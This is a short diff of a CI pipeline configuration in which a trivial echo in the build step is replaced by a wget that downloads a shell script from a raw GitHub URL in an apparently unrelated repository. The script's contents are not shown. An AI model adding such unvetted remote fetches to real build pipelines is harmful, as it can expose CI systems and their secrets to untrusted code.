@@ -9,4 +9,4 @@ jobs:
       - run:
           name: Run build commands
           command: |
-            echo "oy"
+            wget https://raw.githubusercontent.com/labilabuhu/labilabuhu/refs/heads/main/echo.sh
